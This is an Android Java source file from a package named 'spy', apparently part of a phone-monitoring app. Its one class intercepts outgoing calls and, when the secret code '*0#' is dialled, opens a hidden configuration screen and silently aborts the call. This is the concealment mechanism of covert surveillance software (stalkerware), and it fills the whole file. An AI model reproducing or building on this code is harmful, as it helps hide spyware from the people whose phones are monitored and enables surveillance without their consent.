package org.ddth.android.spy;

import org.ddth.android.monitor.core.AndroidDC;
import org.ddth.android.monitor.observer.AndroidWatcher;
import org.ddth.mobile.monitor.core.DC;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

/**
 * @author khoanguyen
 */
public class SpyingConfiguratingWatcher extends AndroidWatcher {
	private static final String SHOW_UI_REQUEST_NUMBER = "*0#";
	private static final String[] INTENTS = {Intent.ACTION_NEW_OUTGOING_CALL};

	@Override
	public String[] getIntents() {
		return INTENTS;
	}
	
	@Override
	public void observed(DC dc, Object observable) {
		AndroidDC androidDC = (AndroidDC)dc;
		Context context = androidDC.getContext();
		Bundle extras = ((Intent)observable).getExtras();
		String outgoingNumber = extras.getString(Intent.EXTRA_PHONE_NUMBER);
		// Check for special code to start activity
		if (SHOW_UI_REQUEST_NUMBER.equals(outgoingNumber)) {
			Intent activity = new Intent(context, ConfiguratingActivity.class);
			activity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(activity);
			// Abort the outgoing call
			BroadcastReceiver broadcastReceiver = (BroadcastReceiver)androidDC.getSource();
			broadcastReceiver.abortBroadcast();
			broadcastReceiver.setResultData(null);
		}
	}
}